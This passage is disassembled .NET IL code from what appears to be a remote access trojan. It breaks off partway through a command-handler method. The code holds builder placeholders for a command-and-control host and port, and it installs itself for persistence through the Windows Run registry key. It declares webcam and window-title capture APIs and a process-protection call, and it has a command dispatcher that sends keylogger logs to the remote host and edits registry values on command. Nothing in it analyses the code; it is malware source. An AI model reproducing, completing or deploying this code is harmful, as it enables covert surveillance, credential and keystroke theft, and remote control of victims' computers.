  .field public bool IsFlooding
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       343 (0x157)
    .maxstack  2
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ldarg.0
    IL_0007:  ldc.i4     0x1401
    IL_000c:  newarr     [mscorlib]System.Byte
    IL_0011:  stfld      uint8[] k.OK::b
    IL_0016:  ldarg.0
    IL_0017:  ldnull
    IL_0018:  stfld      class [System]System.Net.Sockets.TcpClient k.OK::C
    IL_001d:  ldarg.0
    IL_001e:  ldc.i4.0
    IL_001f:  stfld      bool k.OK::Cn
    IL_0024:  ldarg.0
    IL_0025:  newobj     instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::.ctor()
    IL_002a:  stfld      class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer k.OK::F
    IL_002f:  ldarg.0
    IL_0030:  ldstr      ""
    IL_0035:  stfld      string k.OK::lastcap
    IL_003a:  ldarg.0
    IL_003b:  call       string [System.Windows.Forms]System.Windows.Forms.Application::get_ExecutablePath()
    IL_0040:  newobj     instance void [mscorlib]System.IO.FileInfo::.ctor(string)
    IL_0045:  stfld      class [mscorlib]System.IO.FileInfo k.OK::LO
    IL_004a:  ldarg.0
    IL_004b:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
    IL_0050:  stfld      class [mscorlib]System.IO.MemoryStream k.OK::MeM
    IL_0055:  ldarg.0
    IL_0056:  ldnull
    IL_0057:  stfld      object k.OK::MT
    IL_005c:  ldarg.0
    IL_005d:  ldstr      ""
    IL_0062:  stfld      string k.OK::H
    IL_0067:  ldarg.0
    IL_0068:  ldstr      ""
    IL_006d:  stfld      string k.OK::P
    IL_0072:  ldarg.0
    IL_0073:  ldnull
    IL_0074:  stfld      class k.kl k.OK::kq
    IL_0079:  ldarg.0
    IL_007a:  ldnull
    IL_007b:  stfld      object k.OK::PLG
    IL_0080:  ldarg.0
    IL_0081:  ldc.i4.1
    IL_0082:  stfld      bool k.OK::Cnon
    IL_0087:  ldarg.0
    IL_0088:  ldstr      "[PH]"
    IL_008d:  stfld      string k.OK::PH
    IL_0092:  ldarg.0
    IL_0093:  ldstr      "[DR]"
    IL_0098:  stfld      string k.OK::DR
    IL_009d:  ldarg.0
    IL_009e:  ldstr      "[EXE]"
    IL_00a3:  stfld      string k.OK::EXE
    IL_00a8:  ldarg.0
    IL_00a9:  ldstr      "[BD]"
    IL_00ae:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_00b3:  stfld      bool k.OK::BD
    IL_00b8:  ldarg.0
    IL_00b9:  ldstr      "[Idr]"
    IL_00be:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_00c3:  stfld      bool k.OK::Idr
    IL_00c8:  ldarg.0
    IL_00c9:  ldstr      "[Isf]"
    IL_00ce:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_00d3:  stfld      bool k.OK::IsF
    IL_00d8:  ldarg.0
    IL_00d9:  ldstr      "[Isu]"
    IL_00de:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_00e3:  stfld      bool k.OK::Isu
    IL_00e8:  ldarg.0
    IL_00e9:  ldstr      "[RG]"
    IL_00ee:  stfld      string k.OK::RG
    IL_00f3:  ldarg.0
    IL_00f4:  ldstr      "software\\Microsoft\\Windows\\CurrentVersion\\Run"
    IL_00f9:  stfld      string k.OK::sf
    IL_00fe:  ldarg.0
    IL_00ff:  ldstr      "[VN]"
    IL_0104:  stfld      string k.OK::VN
    IL_0109:  ldarg.0
    IL_010a:  ldstr      "0.12G"
    IL_010f:  stfld      string k.OK::VR
    IL_0114:  ldarg.0
    IL_0115:  ldstr      "|'|'|"
    IL_011a:  stfld      string k.OK::Y
    IL_011f:  ldarg.0
    IL_0120:  ldstr      "[Klen]"
    IL_0125:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
    IL_012a:  stfld      int32 k.OK::klen
    IL_012f:  ldarg.0
    IL_0130:  ldstr      "[Hid]"
    IL_0135:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_013a:  stfld      bool k.OK::Hid
    IL_013f:  ldarg.0
    IL_0140:  ldstr      "[Spr]"
    IL_0145:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_014a:  stfld      bool k.OK::Spr
    IL_014f:  ldarg.0
    IL_0150:  ldc.i4.0
    IL_0151:  stfld      bool k.OK::IsFlooding
    IL_0156:  ret
  } // end of method OK::.ctor

  .method public static pinvokeimpl("avicap32.dll" nomangle ansi lasterr winapi) 
          bool  capGetDriverDescriptionA(int16 wDriver,
                                         string&  marshal( byvalstr) lpszName,
                                         int32 cbName,
                                         string&  marshal( byvalstr) lpszVer,
                                         int32 cbVer) cil managed preservesig
  {
  }
  .method public static pinvokeimpl("ntdll" nomangle ansi lasterr winapi) 
          int32  NtsetInformationProcess(native int hProcess,
                                         int32 processInformationClass,
                                         int32& processInformation,
                                         int32 processInformationLength) cil managed preservesig
  {
  }
  .method public static pinvokeimpl("user32.dll" nomangle ansi lasterr winapi) 
          native int  GetForegroundWindow() cil managed preservesig
  {
  }
  .method public static pinvokeimpl("kernel32" as "GetVolumeInformationA" nomangle ansi lasterr winapi) 
          int32  GetVolumeInformation(string&  marshal( byvalstr) lpRootPathName,
                                      string&  marshal( byvalstr) lpVolumeNameBuffer,
                                      int32 nVolumeNamesize,
                                      int32& lpVolumeserialTber,
                                      int32& lpMaximumComponentLength,
                                      int32& lpFilesystemCKs,
                                      string&  marshal( byvalstr) lpFilesystemNameBuffer,
                                      int32 nFilesystemNamesize) cil managed preservesig
  {
  }
  .method public static pinvokeimpl("user32.dll" as "GetWindowTextA" nomangle ansi lasterr winapi) 
          int32  GetWindowText(native int hWnd,
                               string&  marshal( byvalstr) WinTitle,
                               int32 MaxLength) cil managed preservesig
  {
  }
  .method public static pinvokeimpl("user32.dll" as "GetWindowTextLengthA" nomangle ansi lasterr winapi) 
          int32  GetWindowTextLength(int64 hwnd) cil managed preservesig
  {
  }
  .method public static void  main() cil managed
  {
    .entrypoint
    .custom instance void [mscorlib]System.STAThreadAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       13 (0xd)
    .maxstack  1
    .locals init (class k.OK V_0)
    IL_0000:  newobj     instance void k.OK::.ctor()
    IL_0005:  stloc.0
    IL_0006:  ldloc.0
    IL_0007:  callvirt   instance void k.OK::Ncn()
    IL_000c:  ret
  } // end of method OK::main

  .method public instance void  Ncn() cil managed
  {
    // Code size       224 (0xe0)
    .maxstack  5
    .locals init (int32 V_0,
             string V_1,
             class k.OK V_2,
             class [mscorlib]System.Exception V_3,
             string V_4,
             int32 V_5,
             string[] V_6)
    IL_0000:  ldarg.0
    IL_0001:  ldstr      "hp"
    IL_0006:  ldstr      ""
    IL_000b:  callvirt   instance object k.OK::GTV(string,
                                                   object)
    IL_0010:  ldstr      ""
    IL_0015:  ldc.i4.0
    IL_0016:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareObjectEqual(object,
                                                                                                                            object,
                                                                                                                            bool)
    IL_001b:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::NotObject(object)
    IL_0020:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_0025:  brfalse.s  IL_004d

    IL_0027:  ldarg.0
    IL_0028:  ldarg.0
    IL_0029:  ldarg.0
    IL_002a:  ldstr      "hp"
    IL_002f:  ldc.i4.1
    IL_0030:  box        [mscorlib]Microsoft.Win32.RegistryValueKind
    IL_0035:  callvirt   instance object k.OK::GTV(string,
                                                   object)
    IL_003a:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
    IL_003f:  stloc.s    V_4
    IL_0041:  ldloca.s   V_4
    IL_0043:  callvirt   instance string k.OK::DEB(string&)
    IL_0048:  stfld      string k.OK::PH
    IL_004d:  ldc.i4.0
    IL_004e:  stloc.0
    .try
    {
      IL_004f:  ldarg.0
      IL_0050:  ldfld      string k.OK::PH
      IL_0055:  ldstr      ","
      IL_005a:  ldc.i4.m1
      IL_005b:  ldc.i4.0
      IL_005c:  call       string[] [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Split(string,
                                                                                                string,
                                                                                                int32,
                                                                                                valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.CompareMethod)
      IL_0061:  stloc.s    V_6
      IL_0063:  ldc.i4.0
      IL_0064:  stloc.s    V_5
      IL_0066:  br.s       IL_00a3

      IL_0068:  ldloc.s    V_6
      IL_006a:  ldloc.s    V_5
      IL_006c:  ldelem.ref
      IL_006d:  stloc.1
      IL_006e:  ldloc.1
      IL_006f:  ldstr      ""
      IL_0074:  ldc.i4.0
      IL_0075:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_007a:  ldc.i4.0
      IL_007b:  beq.s      IL_0099

      IL_007d:  newobj     instance void k.OK::.ctor()
      IL_0082:  stloc.2
      IL_0083:  ldloc.0
      IL_0084:  ldc.i4.0
      IL_0085:  bne.un.s   IL_0091

      IL_0087:  ldloc.2
      IL_0088:  ldc.i4.1
      IL_0089:  ldloc.1
      IL_008a:  callvirt   instance void k.OK::start(bool,
                                                     string)
      IL_008f:  br.s       IL_0099

      IL_0091:  ldloc.2
      IL_0092:  ldc.i4.0
      IL_0093:  ldloc.1
      IL_0094:  callvirt   instance void k.OK::start(bool,
                                                     string)
      IL_0099:  ldloc.0
      IL_009a:  ldc.i4.1
      IL_009b:  add.ovf
      IL_009c:  stloc.0
      IL_009d:  ldloc.s    V_5
      IL_009f:  ldc.i4.1
      IL_00a0:  add.ovf
      IL_00a1:  stloc.s    V_5
      IL_00a3:  ldloc.s    V_5
      IL_00a5:  ldloc.s    V_6
      IL_00a7:  ldlen
      IL_00a8:  conv.ovf.i4
      IL_00a9:  blt.s      IL_0068

      IL_00ab:  leave.s    IL_00c6

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00ad:  dup
      IL_00ae:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00b3:  stloc.3
      IL_00b4:  ldarg.0
      IL_00b5:  ldstr      "hp"
      IL_00ba:  callvirt   instance void k.OK::DLV(string)
      IL_00bf:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00c4:  leave.s    IL_00df

    }  // end handler
    IL_00c6:  ldarg.0
    IL_00c7:  ldstr      "hp"
    IL_00cc:  ldarg.0
    IL_00cd:  ldarg.0
    IL_00ce:  ldflda     string k.OK::PH
    IL_00d3:  callvirt   instance string k.OK::ENB(string&)
    IL_00d8:  ldc.i4.1
    IL_00d9:  callvirt   instance bool k.OK::STV(string,
                                                 object,
                                                 valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
    IL_00de:  pop
    IL_00df:  ret
  } // end of method OK::Ncn

  .method public instance void  start(bool c,
                                      string s) cil managed
  {
    // Code size       124 (0x7c)
    .maxstack  4
    .locals init (string[] V_0,
             class [mscorlib]System.Threading.Thread V_1,
             class [mscorlib]System.Exception V_2)
    .try
    {
      IL_0000:  ldarg.2
      IL_0001:  ldstr      ":"
      IL_0006:  ldc.i4.m1
      IL_0007:  ldc.i4.0
      IL_0008:  call       string[] [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Split(string,
                                                                                                string,
                                                                                                int32,
                                                                                                valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.CompareMethod)
      IL_000d:  stloc.0
      IL_000e:  ldloc.0
      IL_000f:  ldc.i4.0
      IL_0010:  ldelem.ref
      IL_0011:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_0016:  ldc.i4.0
      IL_0017:  ceq
      IL_0019:  ldc.i4.0
      IL_001a:  ceq
      IL_001c:  ldloc.0
      IL_001d:  ldc.i4.1
      IL_001e:  ldelem.ref
      IL_001f:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_0024:  ldc.i4.0
      IL_0025:  ceq
      IL_0027:  ldc.i4.0
      IL_0028:  ceq
      IL_002a:  and
      IL_002b:  brfalse.s  IL_0060

      IL_002d:  ldarg.0
      IL_002e:  ldloc.0
      IL_002f:  ldc.i4.0
      IL_0030:  ldelem.ref
      IL_0031:  stfld      string k.OK::H
      IL_0036:  ldarg.0
      IL_0037:  ldloc.0
      IL_0038:  ldc.i4.1
      IL_0039:  ldelem.ref
      IL_003a:  stfld      string k.OK::P
      IL_003f:  ldarg.0
      IL_0040:  ldarg.1
      IL_0041:  stfld      bool k.OK::Cnon
      IL_0046:  ldarg.0
      IL_0047:  dup
      IL_0048:  ldvirtftn  instance void k.OK::ko()
      IL_004e:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
                                                                                       native int)
      IL_0053:  ldc.i4.1
      IL_0054:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart,
                                                                                  int32)
      IL_0059:  stloc.1
      IL_005a:  ldloc.1
      IL_005b:  callvirt   instance void [mscorlib]System.Threading.Thread::Start()
      IL_0060:  leave.s    IL_007b

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0062:  dup
      IL_0063:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0068:  stloc.2
      IL_0069:  ldarg.0
      IL_006a:  ldstr      "hp"
      IL_006f:  callvirt   instance void k.OK::DLV(string)
      IL_0074:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0079:  leave.s    IL_007b

    }  // end handler
    IL_007b:  ret
  } // end of method OK::start

  .method public instance void  Ind(uint8[] b) cil managed
  {
    // Code size       4675 (0x1243)
    .maxstack  11
    .locals init (string[] V_0,
             uint8[] V_1,
             class [mscorlib]System.Exception V_2,
             string V_3,
             string V_4,
             class k.OK V_5,
             class [mscorlib]System.Exception V_6,
             object V_7,
             class [mscorlib]System.IO.MemoryStream V_8,
             int32 V_9,
             object V_10,
             class [mscorlib]System.IO.MemoryStream V_11,
             int32 V_12,
             object V_13,
             class [mscorlib]System.IO.MemoryStream V_14,
             int32 V_15,
             class [System.Drawing]System.Drawing.Imaging.EncoderParameters V_16,
             class [System.Drawing]System.Drawing.Graphics V_17,
             class [System.Drawing]System.Drawing.Imaging.ImageCodecInfo V_18,
             class [mscorlib]System.IO.MemoryStream V_19,
             class [mscorlib]System.IO.MemoryStream V_20,
             class [System.Drawing]System.Drawing.Bitmap V_21,
             int32 V_22,
             class [mscorlib]System.IO.MemoryStream V_23,
             int32 V_24,
             string V_25,
             int32 V_26,
             class [mscorlib]System.IO.MemoryStream V_27,
             class [System]System.Net.WebClient V_28,
             class [mscorlib]System.Exception V_29,
             class [mscorlib]System.Exception V_30,
             string V_31,
             int32 V_32,
             class [mscorlib]System.IO.MemoryStream V_33,
             class [mscorlib]System.Exception V_34,
             class [System]System.Net.WebClient V_35,
             class [mscorlib]System.Exception V_36,
             class [mscorlib]System.Exception V_37,
             string V_38,
             int32 V_39,
             string V_40,
             int32 V_41,
             int32 V_42,
             string V_43,
             bool V_44,
             int32 V_45,
             valuetype [mscorlib]System.DateTime V_46,
             uint8[] V_47,
             class [System]System.Net.IPEndPoint V_48,
             class [System]System.Net.Sockets.Socket V_49,
             class [mscorlib]System.Exception V_50,
             class [System]System.Net.Sockets.Socket V_51,
             class [mscorlib]System.Exception V_52,
             class [mscorlib]System.Exception V_53,
             class [mscorlib]System.Exception V_54,
             string V_55,
             string V_56,
             string V_57,
             int32 V_58,
             string[] V_59,
             string[] V_60,
             object[] V_61,
             valuetype [System.Drawing]System.Drawing.Rectangle V_62,
             valuetype [System.Drawing]System.Drawing.Rectangle V_63,
             valuetype [System.Drawing]System.Drawing.Rectangle V_64,
             valuetype [System.Drawing]System.Drawing.Rectangle V_65,
             valuetype [System.Drawing]System.Drawing.Rectangle V_66,
             valuetype [System.Drawing]System.Drawing.Rectangle V_67,
             valuetype [System.Drawing]System.Drawing.Rectangle V_68,
             valuetype [System.Drawing]System.Drawing.Rectangle V_69,
             valuetype [System.Drawing]System.Drawing.Rectangle V_70,
             valuetype [System.Drawing]System.Drawing.Size V_71,
             native int V_72,
             string V_73,
             object[] V_74,
             bool[] V_75,
             valuetype [mscorlib]System.DateTime V_76,
             class [System]System.Net.Sockets.Socket V_77)
    IL_0000:  ldarg.0
    IL_0001:  ldarga.s   b
    IL_0003:  callvirt   instance string k.OK::BS(uint8[]&)
    IL_0008:  ldarg.0
    IL_0009:  ldfld      string k.OK::Y
    IL_000e:  ldc.i4.m1
    IL_000f:  ldc.i4.0
    IL_0010:  call       string[] [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Split(string,
                                                                                              string,
                                                                                              int32,
                                                                                              valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.CompareMethod)
    IL_0015:  stloc.0
    IL_0016:  ldnull
    IL_0017:  stloc.1
    .try
    {
      IL_0018:  ldloc.0
      IL_0019:  ldc.i4.0
      IL_001a:  ldelem.ref
      IL_001b:  stloc.s    V_55
      IL_001d:  ldloc.s    V_55
      IL_001f:  ldstr      "lI"
      IL_0024:  ldc.i4.0
      IL_0025:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_002a:  ldc.i4.0
      IL_002b:  bne.un.s   IL_0039

      IL_002d:  ldarg.0
      IL_002e:  ldc.i4.0
      IL_002f:  stfld      bool k.OK::Cn
      IL_0034:  leave      IL_1242

      IL_0039:  ldloc.s    V_55
      IL_003b:  ldstr      "kl"
      IL_0040:  ldc.i4.0
      IL_0041:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0046:  ldc.i4.0
      IL_0047:  bne.un.s   IL_00bd

      .try
      {
        IL_0049:  ldarg.0
        IL_004a:  ldstr      "kl"
        IL_004f:  ldarg.0
        IL_0050:  ldfld      string k.OK::Y
        IL_0055:  ldarg.0
        IL_0056:  ldarg.0
        IL_0057:  ldfld      class k.kl k.OK::kq
        IL_005c:  ldflda     string k.kl::Logs
        IL_0061:  callvirt   instance string k.OK::ENB(string&)
        IL_0066:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_006b:  callvirt   instance bool k.OK::Send(string)
        IL_0070:  pop
        IL_0071:  leave      IL_1242

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0076:  dup
        IL_0077:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_007c:  stloc.2
        IL_007d:  ldarg.0
        IL_007e:  ldstr      "kl"
        IL_0083:  ldarg.0
        IL_0084:  ldfld      string k.OK::Y
        IL_0089:  ldarg.0
        IL_008a:  ldarg.0
        IL_008b:  ldstr      "kl"
        IL_0090:  ldstr      ""
        IL_0095:  callvirt   instance object k.OK::GTV(string,
                                                       object)
        IL_009a:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
        IL_009f:  stloc.s    V_56
        IL_00a1:  ldloca.s   V_56
        IL_00a3:  callvirt   instance string k.OK::ENB(string&)
        IL_00a8:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_00ad:  callvirt   instance bool k.OK::Send(string)
        IL_00b2:  pop
        IL_00b3:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_00b8:  leave      IL_1242

      }  // end handler
      IL_00bd:  ldloc.s    V_55
      IL_00bf:  ldstr      "prof"
      IL_00c4:  ldc.i4.0
      IL_00c5:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_00ca:  ldc.i4.0
      IL_00cb:  bne.un     IL_02c8

      IL_00d0:  ldloc.0
      IL_00d1:  ldc.i4.1
      IL_00d2:  ldelem.ref
      IL_00d3:  stloc.s    V_57
      IL_00d5:  ldloc.s    V_57
      IL_00d7:  ldstr      "~"
      IL_00dc:  ldc.i4.0
      IL_00dd:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_00e2:  ldc.i4.0
      IL_00e3:  bne.un.s   IL_00f8

      IL_00e5:  ldarg.0
      IL_00e6:  ldloc.0
      IL_00e7:  ldc.i4.2
      IL_00e8:  ldelem.ref
      IL_00e9:  ldloc.0
      IL_00ea:  ldc.i4.3
      IL_00eb:  ldelem.ref
      IL_00ec:  ldc.i4.1
      IL_00ed:  callvirt   instance bool k.OK::STV(string,
                                                   object,
                                                   valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_00f2:  pop
      IL_00f3:  leave      IL_1242

      IL_00f8:  ldloc.s    V_57
      IL_00fa:  ldstr      "!"
      IL_00ff:  ldc.i4.0
      IL_0100:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0105:  ldc.i4.0
      IL_0106:  bne.un.s   IL_015d

      IL_0108:  ldarg.0
      IL_0109:  ldloc.0
      IL_010a:  ldc.i4.2
      IL_010b:  ldelem.ref
      IL_010c:  ldloc.0
      IL_010d:  ldc.i4.3
      IL_010e:  ldelem.ref
      IL_010f:  ldc.i4.1
      IL_0110:  callvirt   instance bool k.OK::STV(string,
                                                   object,
                                                   valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_0115:  pop
      IL_0116:  ldarg.0
      IL_0117:  ldstr      "getvalue"
      IL_011c:  ldarg.0
      IL_011d:  ldfld      string k.OK::Y
      IL_0122:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0127:  ldloc.0
      IL_0128:  ldc.i4.1
      IL_0129:  ldelem.ref
      IL_012a:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_012f:  ldarg.0
      IL_0130:  ldfld      string k.OK::Y
      IL_0135:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_013a:  ldarg.0
      IL_013b:  ldloc.0
      IL_013c:  ldc.i4.1
      IL_013d:  ldelem.ref
      IL_013e:  ldstr      ""
      IL_0143:  callvirt   instance object k.OK::GTV(string,
                                                     object)
      IL_0148:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                             object)
      IL_014d:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_0152:  callvirt   instance bool k.OK::Send(string)
      IL_0157:  pop
      IL_0158:  leave      IL_1242

      IL_015d:  ldloc.s    V_57
      IL_015f:  ldstr      "@"
      IL_0164:  ldc.i4.0
      IL_0165:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_016a:  ldc.i4.0
      IL_016b:  bne.un.s   IL_017b

      IL_016d:  ldarg.0
      IL_016e:  ldloc.0
      IL_016f:  ldc.i4.2
      IL_0170:  ldelem.ref
      IL_0171:  callvirt   instance void k.OK::DLV(string)
      IL_0176:  leave      IL_1242

      IL_017b:  ldloc.s    V_57
      IL_017d:  ldstr      "$"
      IL_0182:  ldc.i4.0
      IL_0183:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0188:  ldc.i4.0
      IL_0189:  bne.un     IL_11a5

      .try
      {
        IL_018e:  ldloc.0
        IL_018f:  ldc.i4.3
        IL_0190:  ldelem.ref
        IL_0191:  callvirt   instance int32 [mscorlib]System.String::get_Length()
        IL_0196:  ldc.i4.0
        IL_0197:  ble.s      IL_01bb

        IL_0199:  ldarg.0
        IL_019a:  ldstr      "i"
        IL_019f:  ldstr      ""
        IL_01a4:  callvirt   instance object k.OK::GTV(string,
                                                       object)
        IL_01a9:  ldstr      ""
        IL_01ae:  ldc.i4.0
        IL_01af:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConditionalCompareObjectEqual(object,
                                                                                                                                         object,
                                                                                                                                         bool)
        IL_01b4:  brfalse.s  IL_01bb

        IL_01b6:  leave      IL_1242

        IL_01bb:  ldarg.0
        IL_01bc:  ldarg.0
        IL_01bd:  ldstr      "hp"
        IL_01c2:  ldstr      ""
        IL_01c7:  callvirt   instance object k.OK::GTV(string,
                                                       object)
        IL_01cc:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
        IL_01d1:  stloc.s    V_56
        IL_01d3:  ldloca.s   V_56
        IL_01d5:  callvirt   instance string k.OK::DEB(string&)
        IL_01da:  stloc.3
        IL_01db:  ldloc.3
        IL_01dc:  callvirt   instance int32 [mscorlib]System.String::get_Length()
        IL_01e1:  ldc.i4.s   10
        IL_01e3:  clt
        IL_01e5:  ldloc.3
        IL_01e6:  callvirt   instance int32 [mscorlib]System.String::get_Length()
        IL_01eb:  ldc.i4.0
        IL_01ec:  ceq
        IL_01ee:  and
        IL_01ef:  brfalse.s  IL_01fe

        IL_01f1:  ldarg.0
        IL_01f2:  ldarg.0
        IL_01f3:  ldflda     string k.OK::PH
        IL_01f8:  callvirt   instance string k.OK::DEB(string&)
        IL_01fd:  stloc.3
        IL_01fe:  ldloc.3
        IL_01ff:  ldloc.0
        IL_0200:  ldc.i4.2
        IL_0201:  ldelem.ref
        IL_0202:  callvirt   instance bool [mscorlib]System.String::Contains(string)
        IL_0207:  brtrue     IL_02a7

        IL_020c:  ldloc.0
        IL_020d:  ldc.i4.2
        IL_020e:  ldelem.ref
        IL_020f:  ldstr      ","
        IL_0214:  ldc.i4.m1
        IL_0215:  ldc.i4.0
        IL_0216:  call       string[] [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Split(string,
                                                                                                  string,
                                                                                                  int32,
                                                                                                  valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.CompareMethod)
        IL_021b:  stloc.s    V_59
        IL_021d:  ldc.i4.0
        IL_021e:  stloc.s    V_58
        IL_0220:  br.s       IL_0268

        IL_0222:  ldloc.s    V_59
        IL_0224:  ldloc.s    V_58
        IL_0226:  ldelem.ref
        IL_0227:  stloc.s    V_4
        IL_0229:  ldloc.s    V_4
        IL_022b:  ldsfld     string [mscorlib]System.String::Empty
        IL_0230:  ldc.i4.0
        IL_0231:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                          string,
                                                                                                                          bool)
        IL_0236:  ldc.i4.0
        IL_0237:  beq.s      IL_0262

        IL_0239:  ldloc.3
        IL_023a:  ldloc.s    V_4
        IL_023c:  ldstr      ","
        IL_0241:  call       string [mscorlib]System.String::Concat(string,
                                                                    string)
        IL_0246:  ldstr      ""
        IL_024b:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                              string)
        IL_0250:  stloc.3
        IL_0251:  newobj     instance void k.OK::.ctor()
        IL_0256:  stloc.s    V_5
        IL_0258:  ldloc.s    V_5
        IL_025a:  ldc.i4.0
        IL_025b:  ldloc.s    V_4
        IL_025d:  callvirt   instance void k.OK::start(bool,
                                                       string)
        IL_0262:  ldloc.s    V_58
        IL_0264:  ldc.i4.1
        IL_0265:  add.ovf
        IL_0266:  stloc.s    V_58
        IL_0268:  ldloc.s    V_58
        IL_026a:  ldloc.s    V_59
        IL_026c:  ldlen
        IL_026d:  conv.ovf.i4
        IL_026e:  blt.s      IL_0222

        IL_0270:  ldloc.0
        IL_0271:  ldc.i4.3
        IL_0272:  ldelem.ref
        IL_0273:  callvirt   instance int32 [mscorlib]System.String::get_Length()
        IL_0278:  ldc.i4.0
        IL_0279:  ble.s      IL_0288

        IL_027b:  ldarg.0
        IL_027c:  ldstr      "i"
        IL_0281:  callvirt   instance void k.OK::DLV(string)
        IL_0286:  br.s       IL_02a7

        IL_0288:  ldloc.3
        IL_0289:  ldloc.0
        IL_028a:  ldc.i4.2
        IL_028b:  ldelem.ref
        IL_028c:  call       string [mscorlib]System.String::Concat(string,
                                                                    string)
        IL_0291:  stloc.3
        IL_0292:  ldarg.0
        IL_0293:  ldstr      "hp"
        IL_0298:  ldarg.0
        IL_0299:  ldloca.s   V_3
        IL_029b:  callvirt   instance string k.OK::ENB(string&)
        IL_02a0:  ldc.i4.1
        IL_02a1:  callvirt   instance bool k.OK::STV(string,
                                                     object,
                                                     valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
        IL_02a6:  pop
        IL_02a7:  leave.s    IL_02c3

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_02a9:  dup
